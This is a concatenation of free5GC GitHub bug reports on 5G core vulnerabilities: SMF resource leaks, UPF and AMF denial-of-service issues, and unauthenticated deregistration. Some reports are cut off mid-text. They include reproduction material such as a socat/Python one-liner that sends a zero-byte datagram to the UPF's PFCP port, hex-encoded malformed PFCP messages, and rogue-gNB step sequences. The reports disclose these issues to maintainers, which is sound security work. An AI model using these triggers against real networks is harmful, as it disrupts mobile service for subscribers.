When the reject path takes any early return (L276, L295, L301), and likewise when the accept path fails on a token or `N1N2MessageTransfer` error, the handler should still release the SMContext via `RemoveSMContextFromAllNF` before returning, so the context, its UE IP and its TEIDs are not leaked.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub.

## Walkthrough (Optional)
The reject path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries. The IP pool binds long before memory does: a `/24` DNN pool holds 254 addresses, so a few hundred leaked contexts exhaust it and new sessions are refused for the whole DNN while `free -m` still looks fine.

## Additional Context
Each create that reaches the reject path and takes L276, L295 or L301 permanently holds one entry in each of the three maps, the SMContext itself (thirteen maps, four ID generators, a BPManager, two UPTunnels, roughly 80 heap objects in the measured run), one UE IP address and four TEIDs.

The AMF does hold `smContextRef` from the `201`, so a release is not structurally impossible the way it is when the identifier is never sent. But the AMF was told the session succeeded and has no reason to release it, and in this scenario the AMF is itself unreachable. In practice these contexts persist until the SMF restarts or a create with the same SUPI and PDU session id reclaims them.

State also diverges three ways: the AMF and UE believe a session exists, the UPF has no session installed, and the SMF holds a context it failed to tear down.

items.title: [Bugs] UPF stops serving PFCP entirely on a single zero-byte UDP datagram to 8805 (read loop exits with "pfcp server stopped"; clean ExitCode=0 leaves no crash signature)
items.body:
## Bug Decription

A single **zero-length** UDP datagram sent to the UPF's PFCP port (8805/udp), with no
authentication, makes the UPF's PFCP server stop listening. The UPF stops answering PFCP
Heartbeat Requests and all N4 traffic; reproduced **3/3**. The same datagram has no effect on
free5GC's own SMF, on OpenAirInterface's UPF/SMF, or on Open5GS's UPF/SMF, so this is specific to
the UPF's PFCP server loop.

Observed sequence per repetition (timestamps from `docker logs`, 2026-09-05):

```
...T06:05:21.260412950Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] handleHeartbeatRequest   <- last heartbeat answered
...T06:05:22.884449138Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] pfcp server stopped      <- zero-byte datagram received here
(no further response to heartbeats; container restarted ~15 s later, RestartCount 2 -> 3)
```

The same three repetitions produced `RestartCount` 2→3, 3→4, 4→5, i.e. the container does restart —
but only **after** an outage window (≈70 s in a separate calibration run, <30 s in this sweep), and
the process then exits with **`ExitCode=0`, `OOMKilled=false`**. The combination makes the event
invisible to ordinary monitoring:

- during the outage window `docker inspect` reports `State.Status = running`, port 8805 is still
  bound, and `RestartCount` has not incremented yet;
- the container has `Health = none`, so no healthcheck observes the outage;
- after the window the exit is clean (code 0, no panic, no signal), so nothing looks like a crash;
  the only traces are the `pfcp server stopped` log line and the incremented `RestartCount`.

Contrast — how the same zero-byte datagram is handled elsewhere:

| Target | Behaviour |
|---|---|
| free5GC **SMF** | `[WARN][SMF][PFCP] Read PFCP error: pfcp: unmarshal msg failed` — datagram dropped, service continues |
| OAI UPF / SMF | `[udp] [error] Recvfrom failed Success` — error logged, heartbeats still answered |
| Open5GS UPF / SMF | no effect |
| free5GC **UPF** | **PFCP server stops; service lost until the container restarts** |

Impact: every PFCP association to that UPF is lost; PDU session establishment, modification and
deletion all fail, and sessions established before the event lose their forwarding state when the
UPF comes back. The interruption is self-healing only because of the Docker `restart` policy.

## To Reproduce

1. Deploy free5GC v4.2.3 with the official docker-compose (no config changes; default
   `upfcfg.yaml`, PFCP listening on the UPF's N4 address).
2. From any host/container that can route to the UPF's 8805/udp (in our lab: the `pentest-client`
   container on the compose network), send one empty datagram:

   ```bash
   printf '' | socat - UDP-DATAGRAM:<UPF_N4_IP>:8805
   # or:
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(b'',('<UPF_N4_IP>',8805))"
   ```

3. Send a PFCP Heartbeat Request before and after (`20 01 00 0c 00 d9 00 00 00 60 00 04 01 02 03 04`):
   before the shot the UPF answers with a 16-byte Heartbeat Response; after the shot there is no
   response at all, and the container log shows `pfcp server stopped`.
4. No packet capture needed: the trigger is a zero-byte datagram.

## Expected Behavior

A zero-length datagram should be treated as an empty (malformed) packet: log it at WARN/ERROR and
continue the read loop, exactly as the SMF does. The PFCP server must not exit its listen loop on a
transport-layer condition, and the UPF should keep serving N4.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3 (official prebuilt image `free5gc/upf:v4.2.3`)
- OS: Ubuntu 22.04.5 LTS (host), Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: 1.26.2 (official builder image `golang:1.26.2-trixie`; runtime images ship no toolchain)
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified defaults; relevant excerpt of `config/upfcfg.yaml`:

```yaml
pfcp:
  addr: 127.0.0.8      # N4 listen address (container-internal in our lab)
  nodeID: 127.0.0.8
```

### PCAP File

Not attached: the trigger is a zero-byte datagram (no payload to capture).

### Log File

Excerpt in "Bug Decription" above; three repetitions on 2026-09-05, each gated by a readiness check
(container running, port bound, process age) and each confirmed by a before/after liveness probe.
`RestartCount` deltas 2→3, 3→4, 4→5; exit code 0, `OOMKilled=false`.

## System Architecture (Optional)

Local container lab only (three 5G cores side by side, 58 containers, 5 Docker networks, UERANSIM
UE/gNB). No traffic was sent to any system outside the lab. The N4 port is not published outside
the host; the demonstrated attacker model is "any host that can route to 8805/udp", which in a
typical deployment includes every NF on the core network and any compromised SMF.

## Walkthrough (Optional)

Found while calibrating liveness oracles for an unrelated test: the UPF kept going silent although
every readiness check passed. Attribution was established by re-sending each candidate datagram
**alone** (zero-byte, one-byte `0x20`, 8-byte truncated header) with liveness probes before and
after; only the zero-byte datagram reproduces the effect. Two suggestions:

1. Treat a zero-length read as an empty datagram and `continue` the read loop instead of exiting it.
2. Add a healthcheck (or an internal watchdog) that fails while the PFCP server loop is not
   running — at present the container looks perfectly healthy throughout the outage, and the
   eventual restart reports exit code 0, so neither crash monitors nor liveness probes see anything.

items.title: [Bugs] AMF processes unprotected initial Deregistration Request for an existing UE context (v4.2.2)
items.body:
## Bug Description

In free5GC v4.2.2, the AMF accepts an initial UE-originated Deregistration Request with security header type 0 (plain NAS, no MAC), even when the UE has completed registration and established a NAS security context using NIA2.

The AMF sends Deregistration Accept, transitions the UE context to Deregistered, and removes the context. No authentication procedure was observed before deregistration.

The issue was reproduced in two tests:

1. **Same-UE test:** A modified UERANSIM-based test harness sends the unprotected request using an existing registered UE context.
2. **Independent-sender test:** A standalone SCTP client, without a SIM or NAS keys, establishes a separate N2 association and sends an InitialUEMessage referring to the registered UE. The AMF processes the request against that UE's context.

In the second test, subsequent registration of the affected UE required a full 5G-AKA procedure.

## To Reproduce

### Test 1: Same-UE unprotected deregistration

1. Run free5GC v4.2.2 with a normal, non-emergency UE registration. Configure NAS integrity as NIA2 and ciphering preference as NEA0, NEA2. The negotiated algorithms in this test were NIA2/NEA0.

2. Complete the registration sequence:

   `registrationRequest authenticationResponse securityModeComplete registrationComplete`

3. Release the UE's RRC/N2 connection while retaining its registration and NAS security context. Confirm RM-REGISTERED / CM-IDLE.

4. Send a non-switch-off Deregistration Request through NGAP InitialUEMessage with:
   - NAS security header type: 0 (no MAC)
   - NAS mobile identity: assigned 5G-GUTI
   - NGAP FiveG-S-TMSI IE: registered UE's 5G-S-TMSI

   The full test sequence is:

   `registrationRequest authenticationResponse securityModeComplete registrationComplete deregistrationRequest`

5. Capture N2 traffic and inspect the AMF logs.

**Observed result:**

- AMF receives the SHT0 Deregistration Request.
- AMF sends Deregistration Accept.
- The UE context transitions from Registered to Deregistered and is removed.

### Test 2: Independent sender

1. Register a test UE and move it to CM-IDLE while retaining its NAS security context.
2. Record the UE's 5G-S-TMSI from the cleartext N2 capture.
3. Use a separate SCTP client to establish an N2 association. NG Setup succeeds with a distinct gNB ID and the configured TAC.
4. Send an InitialUEMessage containing the recorded 5G-S-TMSI and the SHT0 Deregistration Request prepared for the test UE, including its full 5G-GUTI.

**Observed result:**

- AMF identifies the existing UE context by 5G-S-TMSI.
- The independent association receives Deregistration Accept in DownlinkNASTransport, followed by UE Context Release Command.
- AMF logs show the deregistration handler executing and the UE context being removed.
- A subsequent registration attempt by the affected UE requires full 5G-AKA.

[e2e_result.json](https://github.com/user-attachments/files/33272724/e2e_result.json)

The independent sender does not use the victim UE's SIM or NAS keys.

Relevant AMF log events:

`Find 5G-S-TMSI ["fe0000000001"] in InitialUEMessage`

`Handle Deregistration Request(UE Originating)`

`Send Deregistration Accept`

`DeregistrationInitiated -> Deregistered`

## Expected Behavior

An unprotected initial Deregistration Request should not cause an existing registered UE context to be removed without the applicable identity verification or authentication handling.

TS 24.501 allows certain initial deregistration messages to be received without integrity protection, but also specifies how failed or unavailable integrity checks are to be handled (clauses 4.4.4.3 and 4.4.6).

Both tests used normal registration with an established NAS security context, not emergency registration.

Please confirm whether the observed behavior is intended.

## Screenshots

Not included. PCAP files and AMF logs provide the relevant evidence.

## Environment

- free5GC version: v4.2.2
- free5GC commit: `8b0f4445fc931638fb624463ce3572a203517679`
- AMF commit: `02675d949f207a95379af458c7e80fabe802d728`
- OS: Ubuntu 20.04.6 LTS
- Kernel: 5.15.0-139-generic
- Go version: go1.25.5
- C compiler: GCC 9.4.0
- NAS algorithms: NIA2 / NEA0
- Test clients: modified UERANSIM-based harness and standalone C SCTP client

## Trace Files

### Configuration Files

[amfcfg.yaml](https://github.com/user-attachments/files/33272355/amfcfg.yaml)
[free5gc-gnb.yaml](https://github.com/user-attachments/files/33272353/free5gc-gnb.yaml)
[free5gc-ue.yaml](https://github.com/user-attachments/files/33272354/free5gc-ue.yaml)

### PCAP File

[test1-sht0-n2.pcap.zip](https://github.com/user-attachments/files/33272509/test1-sht0-n2.pcap.zip)

[test1-sht1-control-n2.pcap.zip](https://github.com/user-attachments/files/33272514/test1-sht1-control-n2.pcap.zip)

[test2-rogue-n2.pcap.zip](https://github.com/user-attachments/files/33272516/test2-rogue-n2.pcap.zip)

The captures include the InitialUEMessage carrying the SHT0 Deregistration Request, the Deregistration Accept response, and the independent N2 association used in Test 2.

### Log File

[test1-amf.log](https://github.com/user-attachments/files/33272686/test1-amf.log)

[test2-amf.log](https://github.com/user-attachments/files/33272695/test2-amf.log)

The logs record Deregistration Request processing, Deregistration Accept, state transition, and UE-context removal.

### Test Source

I can privately provide the modified test-harness patch and standalone SCTP client source to the maintainers.

## System Architecture (Optional)

Both tests were conducted in a local Ubuntu VM using simulated UE/RAN components.

The independent sender communicated with the AMF through a separate SCTP association on the local N2 interface. No real radio interface was used.

N2 traffic was carried over loopback without IPsec.

## Additional Context

- The AMF source code was not modified.
- A control test using SHT=1 (integrity-protected, not ciphered) also returned Deregistration Accept.
- The reported issue concerns SHT=0 with no NAS MAC, not an invalid MAC.
- The Deregistration Request contains the UE's full 5G-GUTI; the 5G-S-TMSI is separately carried in NGAP InitialUEMessage.
- The independent test used a prepared NAS request containing the test UE's full 5G-GUTI. Obtaining that complete request from the 5G-S-TMSI alone was not demonstrated.
- Large-scale service disruption and behavior with real radio access networks have not been tested.

### Potential Denial-of-Service Impact

The observed behavior may allow repeated denial-of-service against registered UEs. An independent sender can cause the AMF to remove an existing UE context with a single unprotected initial Deregistration Request, without possessing the UE's SIM or NAS keys.

If the same behavior can be triggered after the affected UE re-registers and returns to CM-IDLE, repeated requests could cause recurring registration disruption and additional authentication and signaling overhead. The cost of each attempt may be low once N2 access and the required UE identity information are available.

items.title: [Bugs] UPF Returns Request Accepted When PDR/QER Creation Fails During PFCP Session Modification
items.body: ## Bug Decription When the UPF processes a PFCP Session Modification Request containing a PDR with an invalid SDF Filter, the PDR and QER creation operations fail internally. However, the UPF still returns a PFCP Session Modification Response with Cause = 1 (Request accepted). This causes the PFCP peer to incorrectly believe that all requested forwarding and QoS rules were installed successfully. ## To Reproduce Steps to reproduce the behavior: Start free5GC and establish a PFCP association and session with the UPF. Then send a PFCP Session Modification Request containing a Create PDR IE with the SDF flow description permit out udp from 172.22.0.20 49459 to any. The UPF logs CreateQER error: file exists and CreatePDR error: strconv.ParseUint: parsing "udp": invalid syntax, but the response still contains Cause = Request accepted. The reproducer script and raw PFCP packet are attached. [pfcpliuchengfree.py](https://github.com/user-attachments/files/29946015/pfcpliuchengfree.py) ## Expected Behavior If any mandatory PDR, FAR, QER, or other rule creation operation fails, the UPF should return an appropriate PFCP failure cause instead of Request accepted. The UPF should also roll back any partially created rules or internal session state so that the user-space state remains consistent with the gtp5g kernel state. ## Screenshots ## Environment free5GC Version: v4.2.1 UPF commit: ce0108ac OS: Ubuntu 24.04.1 LTS, running in a VMware virtual machine Kernel version: 6.17.0-22-generic gtp5g version: 0.9.16 Go version: go1.25.5 linux/amd64 C compiler version: GCC 13.3.0 ## Trace Files ### Configuration Files The UPF uses config/upfcfg.yaml with PFCP address 127.0.0.8:8805, GTP-U address 127.0.0.8:2152, and the gtp5g forwarder. items.title: [Bugs]Duplicate SM context is never released when PFCP session deletion fails; each UE retry orphans one SMContext and one UE IP
items.body:
## Bug Description
On a duplicate PDU session create, `HandlePDUSessionSMContextCreate` calls `HandlePDUSessionSMContextLocalRelease` on the old context. That function releases it only in the `SessionReleaseSuccess` branch; `SessionReleaseFailed` and default set the state back to `Active` and return without releasing. It has no return value, so the caller creates a new context regardless, and `NewSMContext` overwrites `canonicalRef[supi-pduSessionId]` with the new UUID.

The old context stays in `smContextPool` and `seidSMContextMap`, holding a UE IP and four TEIDs, and is no longer reachable by SUPI and PSI. The AMF only ever learned the new UUID.

Trigger: PFCP session deletion fails while the UPF stays associated, and the UE retries the same PDU session. One orphan per retry.

The sibling function `HandlePDUSessionSMContextRelease` gets this right: its release sits after the switch and runs on every branch.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef` (and `seidSMContextMap` once PFCP context exists):

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps plus the UE IP and four TEIDs. Its only caller is `RemoveSMContextFromAllNF`:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

**Where it is skipped.** Only `SessionReleaseSuccess` reaches the release:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1352-L1385

```go
pfcpResponseStatus := releaseSession(smContext)

switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:
    ...
    p.RemoveSMContextFromAllNF(smContext, false)   // L1374: the only release

case smf_context.SessionReleaseFailed:
    smContext.SetState(smf_context.Active)         // L1378: no release

default:
    smContext.SetState(smf_context.Active)         // L1383: no release
}
```

A PFCP Session Deletion that times out yields `SessionReleaseFailed`, so that is the branch taken.

**Why nothing recovers it.** `LocalRelease` has no return value, so the caller creates a new context regardless and overwrites the lookup key:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L73-L78

```go
if dup_smCtx := smf_context.GetSMContextById(createData.Supi, createData.PduSessionId); dup_smCtx != nil {
    p.HandlePDUSessionSMContextLocalRelease(dup_smCtx, createData)
}

smContext := smf_context.NewSMContext(createData.Supi, createData.PduSessionId)
```

**The sibling function does it right.** Same switch, same statuses, but the release sits after it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1310

```go
switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:  ...
case smf_context.SessionReleaseFailed:   ...
default:                                 ...
}
p.RemoveSMContextFromAllNF(smContext, false)   // L1310: runs on all three
```

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, oauth off. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; the leaking code is untouched.

The UPF must be associated but unresponsive to deletion: a ~110-line UDP stub answers Association Setup, Heartbeat and Session Establishment (returning a UP F-SEID so the SMF installs the session), but ignores Session Deletion, so deletions time out to `SessionReleaseFailed`. No AMF is run, so an AM policy association is created once directly against the PCF, which is enough for the SM policy lookup to succeed; in a real network the AMF does this. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.)

A probe in the SMF runs `runtime.GC()` and reports the map sizes. Every request reuses `pduSessionId` 88, so `canonicalRef` cannot grow: `smContextPool - canonicalRef` is the orphan count.

**The leak, one retry:**

    attempt 1:  smContextPool 1, seidSMContextMap 1, canonicalRef 1   establishes normally (State→Active), 0 orphans
    attempt 2:  smContextPool 2, seidSMContextMap 2, canonicalRef 1   duplicate found, release failed, 1 orphan

What happened between them, at `level: trace`:

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed          <- L1377, so L1374 was skipped

`is deleted from pool` never appears. The context that attempt 1 established is still in the pool, and `canonicalRef` now points at attempt 2's UUID.

**Accumulation, 30 retries** — same SUPI, same PSI (`pduSessionId` 88), starting from a clean pool:

| n | smContextPool | seidSMContextMap | canonicalRef | orphans |
|---|---|---|---|---|
| 5 | 7 | 7 | 1 | 6 |
| 10 | 12 | 12 | 1 | 11 |
| 15 | 17 | 17 | 1 | 16 |
| 20 | 22 | 22 | 1 | 21 |
| 25 | 27 | 27 | 1 | 26 |
| 30 | 32 | 32 | 1 | 31 |

Slope exactly 1 per retry, no ceiling, unchanged by a forced `runtime.GC()`. `canonicalRef` pinned at 1 throughout, which is why the orphans are unreachable by SUPI and PSI.

    'In case SessionReleaseFailed'           30   deletion failed every retry
    'is deleted from pool'                    0   released nothing
    'Allocated UE IP address'                30   one new context per retry
    'Release IP'                              0   none returned

Attempt 1 is the control: no duplicate, so `LocalRelease` is never called and nothing leaks. Same endpoint, same payload, same code from attempt 2 on.

The default branch at L1380 has the same omission but was not reached in testing.

## Expected Behavior
`HandlePDUSessionSMContextLocalRelease` should release the old context on every branch of the switch — not only `SessionReleaseSuccess` — as the sibling `HandlePDUSessionSMContextRelease` does by placing `RemoveSMContextFromAllNF` after the switch (L1310). Otherwise a failed PFCP deletion leaves an orphaned context that the overwrite of `canonicalRef` makes permanently unreachable.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config, `oauth` off. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub that ignores Session Deletion.

## Walkthrough (Optional)
A PFCP Session Deletion that times out yields `SessionReleaseFailed`, which sets the state back to `Active` and returns without releasing (L1378). Because `LocalRelease` has no return value, the caller creates a new context regardless and `NewSMContext` overwrites `canonicalRef[supi-pduSessionId]` with the new UUID, so the old context is left in `smContextPool` and `seidSMContextMap`, holding its UE IP and four TEIDs, unreachable by SUPI and PSI.

## Additional Context
A UE that re-requests an existing `pduSessionId` takes this path, and each retry with the same `pduSessionId` repeats it. Each one leaves an SMContext, a `seidSMContextMap` entry, a UE IP and four TEIDs held with no normal path to release them.

This trigger is more common than the other leaks of this pair, which need an NRF or AMF outage. Here a UPF-side problem suffices, and the amplification comes from the UE's own retry behaviour.

UE IP exhaustion arrives well before memory pressure: a `/24` DNN pool holds 254 addresses, and the measured run consumed one per retry from a single UE. Once empty, UPF selection fails for every new session on that DNN.


## How did we find?
We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

More critically, it results in host-level memory corruption, making the machine running free5GC nearly unusable: free5GC cannot be stopped or terminated through shell commands; The system shell becomes unresponsive; Local packet capture tools fail to capture traffic; Only rebooting the machine restores functionality. ## To Reproduce Steps to reproduce the behavior: 1.Start free5GC normally. 2.Use the following two files for reproduction: Sender script: [free5gc_upf_crash_repro.py](https://github.com/user-attachments/files/26660363/free5gc_upf_crash_repro.py) Seed/description file: [free5gc_upf_crash_seed.json](https://github.com/user-attachments/files/26660364/free5gc_upf_crash_seed.json) No additional dependencies required (Python 3.8+ standard library only). 3.Run: python3 free5gc_upf_crash_repro.py 4.Expected output confirming crash: [Step 5] SessionEstablishmentRequest:BAR (NO QER) — CP-SEID=0x2f03 CRASH TRIGGER: gtp5gnl.CreateBAROID on stale gtp5g session -> SEND [SessionEstablishmentRequest:BAR [CRASH TRIGGER]] type=50 ... <- RECV TIMEOUT — no response [RESULT] *** CRASH CONFIRMED *** No response received — UPF process has crashed. items.title: [Bugs]PFCP Protocol Compliance Vulnerability: UPF Incorrectly Accepts Malformed Association Requests Causing SMF Connection Disruption
items.body: ## Bug Decription Free5GC UPF component contains a critical PFCP protocol handling vulnerability that improperly processes malformed PFCP Association Setup Request messages. Instead of rejecting invalid messages with appropriate error codes as per 3GPP TS 29.244 standards, UPF accepts malformed requests, leading to inconsistent states and subsequent SMF-UPF connection disruptions. ## To Reproduce Steps to reproduce the behavior: 1.Send a malformed PFCP Association Setup Request to UPF (port 8805) Message:210500640000000000000000000058dd0039000d02123456789abcdef00a0000010003000e006c0004000000c8002c00020200003c000500c0a8010100010017003800020064001d000400007530000200050014000100 Wireshark analysis shows: "malformed packet: length of contained item exceeds length of containing item" 2.Observe UPF incorrectly responds with PFCP Association Setup Response containing "Cause: Request accepted (success)" 3.Send a valid PFCP Session Establishment Request message Message:213200530000000000000000000000000039000d02123456789abcdef00a0000010003000e006c0004000000c8002c00020200003c000500c0a8010100010017003800020064001d000400007530000200050014000100 4.Observe SMF enters reconnection loop and service degradation ## Expected Behavior According to 3GPP TS 29.244: 1.UPF should detect and reject malformed PFCP Association Setup Request messages 2.UPF should respond with appropriate error cause (e.g., "Malformed message" or "Invalid length") 3.UPF should not establish association for malformed requests 4.SMF should maintain stable connections without entering infinite reconnection loops ## Screenshots ## Environment **Please, complete the following information:** - free5GC Version: v4.0.1 - OS: Ubuntu 22.04 Server - Kernel version: (Not specified) - go version: (Not specified) - C compiler version (optional): (Not specified) ## Trace Files UPF Configuration (upfcfg.yaml) relevant section: pfcp: addr: 127.0.0.8 nodeID: 127.0.0.8 retransTimeout: 1s maxRetrans: 3 ### PCAP File ### Log File 2025-11-21T16:38:33.068634949Z [INFO][UPF][PFCP] handleSessionEstablishmentRequest 2025-11-21T16:38:46.397540213Z [ERRO][SMF][Main] PFCP Heartbeat error: SendPfcpHeartbeatRequest error 2025-11-21T16:38:46.397721099Z [INFO][SMF][Main] Release all resources of UPF [127.0.0.8] 2025-11-21T16:38:46.397745934Z [INFO][SMF][Main] Sending PFCP Association Request to UPF[127.0.0.8] 2025-11-21T16:38:55.406598374Z [WARN][SMF][Main] Failed to setup an association with UPF ## Additional Context This vulnerability demonstrates a protocol compliance issue where: 1.Input Validation Failure: UPF fails to properly validate PFCP message structure and lengths 2.State Management Issue: Malformed messages put UPF into inconsistent states 3.Cascading Failure: Subsequent legitimate messages trigger service disruption 4.Denial of Service Impact: Attackers can disrupt core network functionality with minimal effort The root cause appears to be insufficient message validation in UPF's PFCP message parser, allowing malformed messages to bypass proper error handling.

items.title: [Bugs] UPF vulnerable to malformed PFCP Session Establishment Request causing denial of service via timer resource leakage
items.body: ## Bug Decription A critical denial-of-service (DoS) vulnerability exists in the UPF's PFCP (Packet Forwarding Control Protocol) handler where a specially crafted Session Establishment Request causes the UPF to leak timer resources that are never cleaned up. The core issue is timer resource leakage: Even when PDR and FAR creation fails (with "invalid argument" errors), the UPF still successfully creates periodic timers for URRs (Usage Reporting Rules), leaving background goroutines and memory allocated indefinitely. The vulnerability demonstrates two attack vectors: 1.Timer resource leakage: Despite PDR and FAR creation failure, UPF creates URR timers that continue running in the background, consuming CPU and memory resources 2.Inconsistent state: UPF enters a half-created state (with URRs but no PDRs/FARs) that prevents normal PFCP message processing A single malicious PFCP message from an attacker can create permanent background timers that accumulate over time, eventually exhausting UPF resources and rendering it unable to process legitimate SMF heartbeat and association requests. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Sending Association Setup Request (30 bytes): 2005001a75b78900003c0005007f00006400600004ed103703005900013f 3. Sending Session Establishment Request (1335 bytes)  ## Expected Behavior The UPF should: Validate input rigorously: Check all PFCP IEs for valid ranges, combinations, and consistency before processing Graceful error handling: Reject malformed messages with appropriate PFCP Cause values (e.g., 73 - Invalid arguments) without entering an inconsistent state Resource protection: Implement resource limits and quotas to prevent exhaustion attacks Isolation and recovery: Isolate the impact of malformed messages and maintain ability to process other requests Timeouts and cleanup: Implement timeouts for message processing and automatic cleanup of partially created sessions Input sanitization: Reject or sanitize invalid values like 0xffffffff for IDs, malformed IP addresses, etc. ## Screenshots ## Environment free5GC Version: v4.0.1 OS: Ubuntu 20.04 Server Kernel version: 6.8.0-47-generic go version: go1.24.5 linux/amd64 ## Trace Files ### Configuration Files pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission peers: - [Bugs] Heap Buffer Overflow in UPF via Malformed PFCP Session Modification Request Causes UPF Crash
items.body: ## Bug Decription A critical heap buffer overflow vulnerability exists in the Free5GC UPF network function when processing maliciously crafted PFCP Session Modification Request messages. The vulnerability is triggered by malformed SDF Filter Information Elements containing invalid length fields, causing the entire UPF network element to crash due to out-of-bounds memory access. ## To items.body:
## Bug Decription
free5gc AMF crashes (v4.2.3) or permanently kills a Worker goroutine (v4.3.0) when it handles `UEContextReleaseComplete` with `ReleaseAction = UeContextReleaseHandover`. The crash occurs at `handler.go:357` (v4.3.0) / `handler.go:328` (v4.2.3) where `ranUe.TargetUe.AmfUeNgapId` is accessed but `ranUe.TargetUe` is nil. An N2 peer that can reach the AMF SCTP/NGAP interface can trigger a denial of service.

Two independent trigger paths reach the same crash point:
1. **HandoverFailure path**: gNB-B sends `HandoverFailure` → AMF sends `UEContextReleaseCommand` to gNB-B → gNB-B replies `UEContextReleaseComplete` → crash
2. **HandoverCancel path**: gNB-A sends `HandoverCancel` → AMF sends `UEContextReleaseCommand` to gNB-B → gNB-B replies `UEContextReleaseComplete` → crash

## To Reproduce
### Prerequisites

1. Deploy free5gc with default configuration; all NFs running (NRF, UDR, UDM, AUSF, NSSF, PCF, UPF, SMF, AMF).
2. Subscriber `imsi-208930000000001` provisioned with K/OPC in UDR.

### Steps (HandoverFailure path)

1. Establish two SCTP associations to AMF (gNB-A and gNB-B), complete NG Setup on both.
2. Via gNB-A: send `InitialUEMessage` with SUCI Registration Request, complete full 5G-AKA authentication (AuthenticationResponse, SecurityModeComplete with IMEISV), receive Registration Accept.
3. Via gNB-A: establish a PDU Session (PDUSessionEstablishmentRequest → PDUSessionResourceSetupRequest).
4. Via gNB-A: send `HandoverRequired` (target gNB-B). AMF creates a target RanUe and sends `HandoverRequest` to gNB-B.
5. Via gNB-B: send `HandoverFailure` (instead of HandoverRequestAcknowledge).
6. AMF sends `UEContextReleaseCommand` to gNB-B with `ReleaseAction = UeContextReleaseHandover`.
7. Via gNB-B: send `UEContextReleaseComplete`.
8. **AMF panics** at `handler.go:357`: `ranUe.TargetUe` is nil.

### Steps (HandoverCancel path)

Steps 1–4 are the same. Then:
5. Via gNB-A: send `HandoverCancel` (source cancels the handover).
6. AMF sends `UEContextReleaseCommand` to gNB-B with `ReleaseAction = UeContextReleaseHandover`, and `HandoverCancelAcknowledge` to gNB-A.
7. Via gNB-B: send `UEContextReleaseComplete`.
8. **AMF panics** at the same `handler.go:357`.

## Expected Behavior
AMF should check `ranUe.TargetUe` for nil before accessing `ranUe.TargetUe.AmfUeNgapId` in the `UeContextReleaseHandover` case of `handleUEContextReleaseCompleteMain`. If nil, AMF should log an error, clean up the RanUe, and continue operating.

## Observed behavior

**v4.2.3**: AMF process terminates. 
The `recover()` in `handleConnection` calls `logger.Fatalf()` which invokes `os.Exit(1)`. A single attack kills the AMF process.

**v4.3.0**: AMF process survives, but the Worker handling this UE dies permanently. 
The Worker Pool's `recover()` uses `Errorf` (non-fatal), but the Worker goroutine exits and is never restarted. See the linked Worker permanent death issue for the DoS amplification.

## Root cause

